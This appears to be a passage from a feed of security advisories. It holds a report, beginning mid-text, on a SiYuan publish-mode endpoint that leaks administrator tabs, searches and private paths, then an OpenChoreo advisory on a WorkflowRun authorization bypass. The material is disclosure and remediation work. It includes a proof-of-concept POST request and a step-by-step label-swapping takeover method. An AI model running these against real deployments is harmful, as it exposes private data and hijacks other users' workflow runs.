That advisory concerned the administrator's live UI layout, and commit 63c7d5474 resolved it by removing FilterUILayoutByPublishIgnore and nulling Conf.UILayout for readers. That fix is correct and complete for the live layout.

This report concerns a different endpoint, a different filter function and a different storage backing. /api/storage/getLocalStorage reads data/storage/local.json rather than Conf.UILayout, and its filter FilterLocalStorageByPublishAccess was not touched by that commit. The consequence is that the same serialized tab objects the earlier fix withheld continue to be served, from the closed-tab history rather than the live layout.

Summary

Three routes, /api/storage/getLocalStorage, getLocalStorageVal and getLocalStorageVals, are registered with CheckAuth only and are reachable by the publish RoleReader token and anonymously when Publish.Auth.Enable is false. All three call model.GetLocalStorage() and then, for read-only roles, FilterLocalStorageByPublishAccess.

That filter begins by assigning the administrator's entire storage map to its return value and then removes three specific fields. Everything else in the map is returned unmodified. A single unauthenticated POST with an empty body returns the administrator's recently closed tabs with their document titles and identifiers, their current search keywords and the paths those searches cover, the expanded private paths in their file tree, and per-document identifiers from several other keys.

Details

Routes. kernel/api/router.go:87-89 on master, the same block on the development branch:

ginServer.Handle("POST", "/api/storage/getLocalStorage",     model.CheckAuth, getLocalStorage)
ginServer.Handle("POST", "/api/storage/getLocalStorageVal",  model.CheckAuth, getLocalStorageVal)
ginServer.Handle("POST", "/api/storage/getLocalStorageVals", model.CheckAuth, getLocalStorageVals)

No CheckAdminRole, no CheckReadonly.

The filter is an allowlist inverted into a blocklist. kernel/model/publish_access.go:911 on master and :1481 on the development branch, byte-identical on both:

func FilterLocalStorageByPublishAccess(publishAccess PublishAccess, localStorage map[string]any) (ret map[string]any) {
    ret = localStorage            // the entire administrator map
    publishIgnore := GetInvisiblePublishAccess(publishAccess)
    // clears local-searchkeys["keys"]
    // clears local-searchasset["k"] and ["keys"]
    // blanks local-docinfo["id"], only when bt != nil, visible tier only, no password check
    return
}

local.json holds roughly thirty keys. Three are sanitized. The rest are returned as stored.

What survives. Taking the client's own list of keys it round-trips through this endpoint (app/src/protyle/util/compatibility.ts:563), the notable survivors are:

  • local-closed-tabs. Up to SIZE_UNDO entries, each produced by layoutToJSON(item, tabJSON) at app/src/layout/Wnd.ts:779. This is the same serializer that produced the data in the earlier advisory: tab title, docIcon, rootId, notebookId, blockId, mode, action, and for a Search tab the entire config object. Unfiltered.
  • local-searchdata. The live document-search configuration, including k (the search text), r (replace text), hPath, idPath (the paths the search was scoped to) and types. Note the filter clears the search history array and the asset-search keyword, but leaves the document-search keyword itself. The project's own standard is applied to two of the three related fields.
  • local-filespaths. IFilesPath[] of {notebookId, openPaths[]}, the expanded private notebook and folder paths in the file-tree dock.
  • local-fileposition, local-outline, local-zoom. Keyed by document or block identifier, so each discloses private document identifiers.
  • local-move-path. {keys[], k}, the move-document dialog's path history and last keyword.
  • local-recent-docs, local-history, local-flashcard, local-dailynoteid, local-layouts.

The asymmetry is visible in the function signature. In the same file, kernel/api/storage.go:

Handler Filter Receives *gin.Context
getCriteria FilterCriteriaByPublishAccess(c, ...) yes
getRecentDocs FilterRecentDocsByPublishAccess(c, ...) yes
getLocalStorage / Val / Vals FilterLocalStorageByPublishAccess(publishAccess, data) no

The two sibling filters take the request context and can therefore call CheckPublishAuthCookie to evaluate the password tier. FilterLocalStorageByPublishAccess does not receive the context, so it cannot perform that check at all. The visible-only limitation is fixed in the parameter list rather than in the body.

Separately, local-recent-docs passes through this endpoint unfiltered, which bypasses the dedicated FilterRecentDocsByPublishAccess that guards the same data on getRecentDocs.

Note on a prior assessment. getLocalStorage appears on lists of endpoints considered correctly filtered, on the basis that it calls a Filter*ByPublishAccess function. That observation is accurate and this report does not contradict it. The filter is called. What it does is assign the whole map and remove three fields.

No persistence side effect. The in-place mutations the filter performs do not corrupt the administrator's stored state, because GetLocalStorage re-reads and unmarshals storage/local.json on each call (kernel/model/storage.go:82), so the map is per-request. This is noted to pre-empt the concern rather than as part of the finding.

Proof of Concept

Precondition: publish mode enabled (default port 6808), anonymous when Publish.Auth.Enable is false, otherwise any publish reader account. An administrator who has used the client normally, closing some document tabs and running a search.

POST http://127.0.0.1:6808/api/storage/getLocalStorage
{}

→ 200. The returned map includes, among others:
     local-closed-tabs   entries carrying title, docIcon, rootId, notebookId,
                         blockId for recently closed documents, including
                         documents the reader has no publish access to
     local-searchdata    k, r, hPath, idPath for the administrator's current
                         document search
     local-filespaths    notebookId and openPaths for expanded private folders
     local-fileposition  keys are private document identifiers

getLocalStorageVal returns any single key by name, so a caller who only wants the closed-tab history can request it directly.

For contrast, requesting the same underlying data through the sibling endpoint shows the filtering that is applied elsewhere:

POST http://127.0.0.1:6808/api/storage/getRecentDocs
{}

→ 200, filtered by FilterRecentDocsByPublishAccess

while local-recent-docs inside the storage response is not.

Impact

An anonymous reader in publish mode, or any publish RoleReader, obtains the administrator's working context: the titles and identifiers of documents they recently had open, what they have been searching for and where, which private folders they have expanded, and per-document identifiers across several other keys. Titles and search keywords are author-written text and routinely describe the subject of the documents they refer to.

The document and notebook identifiers disclosed here are also the input required by identifier-to-path and path-to-content resolution, so the value is not limited to the metadata itself.

No document bodies are returned, and nothing is written. Confidentiality only.

Suggested fix

Invert the filter into an actual allowlist. Return only the keys a publish reader needs to render published content, which is a short list along the lines of local-images, local-emojis, local-pdftheme, local-fontstyles and the theme and zoom preferences, and drop everything else by default. New keys added in future then default to withheld rather than exposed.

Additionally, pass *gin.Context into FilterLocalStorageByPublishAccess so that any retained per-document entry can be gated with the full CheckBlockIdAccessableByPublishAccess including the password tier, matching the sibling filters in the same file.

References

  • https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xp3q-r38w-vgqm
  • https://github.com/siyuan-note/siyuan/commit/4daee87d41521d119979f2edda67e87f2be7b6ef
  • https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.3
  • https://github.com/advisories/GHSA-xp3q-r38w-vgqm

entry.title: [github.com/openchoreo/openchoreo] OpenChoreo: Authorization bypass on WorkflowRun update allows cross-project takeover of workflow runs
entry.content:
Summary

The OpenChoreo API server authorized PUT .../workflowruns/{runName} against ownership metadata taken from the request body, while the object it actually mutated was selected by the URL path. Nothing forced the two to agree.

A WorkflowRun's membership in a project and component is carried entirely by its openchoreo.dev/project and openchoreo.dev/component labels. Because the workflowrun:update check read those labels from the submitted object rather than the stored one, a caller holding workflowrun:update on one component could name a run belonging to a different project or component in the URL, supply labels for the component they legitimately control, pass the check, and have the unrelated run rewritten with their own ownership labels.

The namespace is taken from the URL and feeds both the authorization check and the Kubernetes read, so it cannot diverge. This is cross-project and cross-component escalation inside a single namespace, not a cross-tenant issue.

Impact

Rewriting the ownership labels transfers authority over the run. Every other WorkflowRun check (view, logs, events, status, delete, list) derives its scope from the stored labels, so once the write lands the policy engine legitimately grants the attacker access to an object they never had rights to. They can then:

  • Read the victim's build logs. These stream raw pod logs from the workflow plane and routinely carry source paths, registry destinations, and credentials a build step echoed by accident.
  • Read the run's Kubernetes events.
  • Delete the run.

So the primary impact is confidentiality and availability, not only integrity. On the integrity side, spec.workflow.parameters can be overwritten on a pending run, and manipulating the two ownership labels can either wedge the run in a permanent ComponentValidationFailed condition or downgrade it to a standalone run that skips component validation.

Exploitation requires an authenticated caller with an AuthzRoleBinding or ClusterAuthzRoleBinding granting workflowrun:update at project or component scope in the victim's namespace, plus knowledge of the target run's name. An anonymous caller cannot reach this.

Patches

The authorization check now loads the stored WorkflowRun and derives every ownership attribute from it instead of from the request body. Separately, the openchoreo.dev/project and openchoreo.dev/component labels are now immutable on update, so an authorized caller cannot hand their own run to another project either.

Workarounds

If you cannot upgrade immediately, restrict who holds workflowrun:update.

Audit your AuthzRole and ClusterAuthzRole definitions for that action and remove it from any role granted to principals you would not trust with write access to every workflow run in the namespace. Among the roles shipped with OpenChoreo, only the system role workload-publisher lists workflowrun:update explicitly, and admin holds it through its * wildcard. Custom roles in your own values file may also include it, so check those.

Treat any credential bound to workload-publisher as privileged. CI systems are the usual holder, and a leaked CI token is enough to run this.
